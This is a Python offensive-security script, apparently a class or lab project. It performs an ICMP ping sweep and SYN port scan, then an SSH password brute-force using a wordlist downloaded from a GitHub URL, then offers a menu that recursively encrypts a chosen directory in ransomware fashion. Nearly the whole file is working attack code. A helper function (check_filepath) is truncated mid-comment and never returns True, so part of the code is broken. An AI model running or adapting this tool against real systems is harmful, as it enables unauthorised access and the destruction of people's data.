#!/usr/bin/python3
# Created by Omar Ardid and Cody Blahnik
import subprocess
import logging
from cryptography.fernet import Fernet
from scapy.layers.inet import IP, TCP, ICMP
from scapy.sendrecv import sr1, send
import ipaddress
import time
import paramiko, os, sys, socket
import zipfile
import requests

# Configure logging
logging.basicConfig(filename='tool.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Scan a specific port on a target IP address
def scan_port(target_ip, port):
    try:
        # Creating an IP packet with TCP layer
        ip_pkt = IP(dst=target_ip)
        tcp_pkt = TCP(dport=port, flags="S")
        # Sending the packet and receiving a response
        response = sr1(ip_pkt/tcp_pkt, timeout=0.1, verbose=0)
        if response:
            # Checking the flags in response
            if response.haslayer(TCP):
                flags = response.getlayer(TCP).flags
                # Checking if flags is set to 0x12
                if flags == 0x12: # SYN-ACK check
                    send(ip_pkt/TCP(dport=port, flags="R"), verbose=0)
                    print(f"Port {port} is open")
                    logging.info(f"Port {port} is open on {target_ip}")
                # Checking if flags is set to 0x14
                elif flags == 0x14: # RST-ACK check
                    print(f"Port {port} is closed")
                    logging.info(f"Port {port} is closed on {target_ip}")
                else:
                    print(f"Port {port} is filtered and silently dropped")
                    logging.info(f"Port {port} is filtered and silently dropped on {target_ip}")
        else:
            print(f"Port {port} is filtered and silently dropped")
            logging.info(f"Port {port} is filtered and silently dropped on {target_ip}")
    except Exception as e:
        print(f"An error occurred while scanning port {port}: {e}")
        logging.error(f"An error occurred while scanning port {port} on {target_ip}: {e}")

# Perform ICMP ping sweep on a network and scan open ports on responsive hosts
def icmp_ping_and_scan(target_ip, ports):
    online_count = 0
    # Check if the input is a single IP address
    if "/" not in target_ip:
        # Check if the provided IP address is valid
        try:
            ipaddress.ip_address(target_ip)
        except ValueError:
            print("Invalid IP address provided.")
            logging.error("Invalid IP address provided.")
            return

        # Creating ICMP packet and sending it 
        pkt = IP(dst=target_ip) / ICMP()
        resp = sr1(pkt, timeout=0.1, verbose=0)
        # Check response 
        if resp is None:
            print(f"Host {target_ip} is down or unresponsive.")
            logging.warning(f"Host {target_ip} is down or unresponsive.")
            return
        elif resp.haslayer(ICMP) and resp[ICMP].type == 3 and resp[ICMP].code in [1, 2, 3, 9, 10, 13]:
            print(f"Host {target_ip} is actively blocking ICMP traffic.")
            logging.warning(f"Host {target_ip} is actively blocking ICMP traffic.")
            return
        else:
            print(f"Host {target_ip} is responding.")
            logging.info(f"Host {target_ip} is responding.")
            online_count += 1
            # Scan ports if host is responsive
            for port in ports:
                scan_port(target_ip, port)
    else:
        # Create an IP network variable
        network_address = ipaddress.ip_network(target_ip, strict=False)
        for ip in network_address.hosts():
            ip = str(ip)
            # Run through each host in the network (excluding network and broadcast addresses)
            if ipaddress.ip_address(ip) in [network_address.network_address, network_address.broadcast_address]:
                continue
            # Creating ICMP packet and sending it 
            pkt = IP(dst=ip) / ICMP()
            resp = sr1(pkt, timeout=0.1, verbose=0)
            # Check response 
            if resp is None:
                print(f"Host {ip} is down or unresponsive.")
                logging.warning(f"Host {ip} is down or unresponsive.")
            elif resp.haslayer(ICMP) and resp[ICMP].type == 3 and resp[ICMP].code in [1, 2, 3, 9, 10, 13]:
                print(f"Host {ip} is actively blocking ICMP traffic.")
                logging.warning(f"Host {ip} is actively blocking ICMP traffic.")
            else:
                print(f"Host {ip} is responding.")
                logging.info(f"Host {ip} is responding.")
                online_count += 1
                # Scan ports if host is responsive
                for port in ports:
                    scan_port(ip, port)
    
    # Print the total number of online hosts if it's not a single IP address
    if "/" in target_ip:
        print(f"\n{online_count} hosts are online.")
        logging.info(f"{online_count} hosts are online in network {target_ip}.")

# Function to download a file from a URL and save it locally
def download_file(url, local_file_path):
    try:
        response = requests.get(url)
        response.raise_for_status()
        with open(local_file_path, 'wb') as file:
            file.write(response.content)
        print(f"File downloaded successfully and saved as {local_file_path}")
        logging.info(f"File downloaded successfully from {url} and saved as {local_file_path}")
        return local_file_path
    except requests.exceptions.RequestException as e:
        print(f"An error occurred while downloading the file: {e}")
        logging.error(f"An error occurred while downloading the file from {url}: {e}")
        return None

# Function to read passwords from a file
def read_passwords(password_file):
    # Open the file in read mode
    with open(password_file, "r") as file:
        # Read each line, strip trailing whitespace, and return as a list
        return [line.rstrip() for line in file]

# Function to check if a file path is valid    
def check_filepath(file_path, file_description):
    # Check if the given path is a valid file
    if not os.path.isfile(file_path):
        print(f"(ง •̀_•́)ง {file_description} not found. Please enter a valid file path!")
        logging.error(f"{file_description} not found at {file_path}")
        # Return False if the

def ssh_brute_force(target_ip, password_file_url):    
    logging.info("Starting SSH brute force attack.")

    # Prompt the user for target host address, SSH username, and password file path
    username = input("Enter SSH Username: ")
    local_file_path = 'downloaded_password_file.txt'
    input_file = download_file(password_file_url, local_file_path)
    if input_file is None:
        logging.error("Failed to download password file. Aborting SSH brute force attack.")
        return
    # Checks if file path exists
    if not check_filepath(input_file, "Password file"):
        logging.error("Invalid password file path. Aborting SSH brute force attack.")
        return

    try:
        # Open password file in read mode
        with open(input_file, 'r') as file:
            # Iterate over each password in the file
            for password in file:
                # Remove trailing whitespace from password
                password = password.rstrip()
                try:
                    # Create an SSH Client instance
                    ssh = paramiko.SSHClient()
                    # Set policy for automatically adding host keys
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    # Attempt SSH connection using the current password
                    logging.info(f"Trying password: {password}")
                    ssh.connect(target_ip, port=22, username=username, password=password, banner_timeout=10, auth_timeout=10)
                    # Print success message if password is correct
                    print(f"٩(◕‿◕)۶ Success! Password found: {password}")
                    logging.info(f"Success! Password found: {password}")
                    return
                except paramiko.AuthenticationException:
                    # Print error message if authentication fails
                    print(f"(.づ◡ ﹏◡)づ. Failed! incorrect password: {password}")
                    logging.warning(f"Failed! Incorrect password: {password}")
                except socket.error as e:
                    # Print error message if a socket error occurs
                    print(f"(`･︿´･ ) An error occurred: {e}")
                    logging.error(f"A socket error occurred: {e}")
                except paramiko.SSHException as e:
                    # Handle SSH exceptions, including banner errors
                    print(f"(`･︿´･ ) SSH error occurred: {e}")
                    logging.error(f"SSH error occurred: {e}")
                    if "Error reading SSH protocol banner" in str(e):
                        print("Error reading SSH protocol banner. Ensure the target server is an SSH server and is reachable.")
                        logging.error("Error reading SSH protocol banner. Ensure the target server is an SSH server and is reachable.")
                    time.sleep(1)  # Sleep briefly to avoid overwhelming the server
    except KeyboardInterrupt:
        # Print message if user interrupts the process
        print("User Requested An Interrupt")
        logging.warning("User Requested An Interrupt")
        # Exit the program
        sys.exit(3)
    logging.info("SSH brute force attack completed.")

# Function to generate and write a key to a file
def write_key():
    key = Fernet.generate_key()
    with open("key.key", "wb") as key_file:
        key_file.write(key)

# Function to load the key from a file
def load_key():
    return open("key.key", "rb").read()

# Function to encrypt a file
def encrypt_file(file_path, key):
    try:
        f = Fernet(key)
        with open(file_path, "rb") as file:
            file_data = file.read()
        encrypted_data = f.encrypt(file_data)
        with open(file_path, "wb") as file:
            file.write(encrypted_data)
        print("File encrypted successfully!")
        logging.info(f"File encrypted successfully: {file_path}")
    except Exception as e:
        print(f"Error encrypting file: {e}")
        logging.error(f"Error encrypting file {file_path}: {e}")

# Function to decrypt a file
def decrypt_file(file_path, key):
    try:
        f = Fernet(key)
        with open(file_path, "rb") as file:
            encrypted_data = file.read()
        decrypted_data = f.decrypt(encrypted_data)
        with open(file_path, "wb") as file:
            file.write(decrypted_data) 
        print("File decrypted successfully!")
        logging.info(f"File decrypted successfully: {file_path}")
    except FileNotFoundError:
        print(f"Error: Encrypted file '{file_path}' not found.")
        logging.error(f"Error decrypting file {file_path}: Encrypted file not found.")
    except Exception as e:
        print(f"Error decrypting file: {e}")
        logging.error(f"Error decrypting file {file_path}: {e}")

def encrypt_directory(directory_path, key):
    logging.info(f"Encrypting directory: {directory_path}")
    # Using Recursively to encrypt all files in the specified directory and its subdirectories
    for root, dirs, files in os.walk(directory_path):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            encrypt_file(file_path, key) # Encrypt each file
    print("Directory has been encrypted!")
    logging.info(f"Directory encrypted: {directory_path}")

def decrypt_directory(directory_path, key):
    logging.info(f"Decrypting directory: {directory_path}")
    # Using Recursively to decrypt all files in the specified directory and its subdirectories
    for root, dirs, files in os.walk(directory_path):
        for file_name in files:
            file_path = os.path.join(root, file_name)
            decrypt_file(file_path, key) # Decrypt each file
    print("Directory has been decrypted!")
    logging.info(f"Directory decrypted: {directory_path}")

def menu():
    while True:
        print("\n~~~~~ Encrypt Attack ~~~~~")
        print("1. Encrypt Directory and all its contents")
        print("2. Decrypt Directory and all its contents")
        print("0. Exit")
        choice = input("Enter a number: ")

        if choice == "1":
            write_key() # Generating a key
            key = load_key() # Load that generated key into "key" variable
            folder_path = input("Enter the folder path to encrypt: ")
            encrypt_directory(folder_path, key) # Encrypts the specified directory
        elif choice == "2":
            key = load_key() # Loading the key
            folder_path = input("Enter the folder path to decrypt: ")
            decrypt_directory(folder_path, key) # Decrypt the specified directory
        elif choice == "0":
            print("(づ ◕‿◕ )づ Goodbye!")
            break
        else:
            print("\nง •̀_•́)ง Invalid number! ")

if __name__ == "__main__":
    target_ip = input("Enter the target IP address or network (e.g., 192.168.1.1 or 192.168.1.0/24): ")
    icmp_ping_and_scan(target_ip, [22, 80, 443, 3389])
    password_file_url = 'https://raw.githubusercontent.com/Interslice-Inc/Interslice/main/Files/Scripts/password_list.txt'
    ssh_brute_force(target_ip, password_file_url)
    menu()
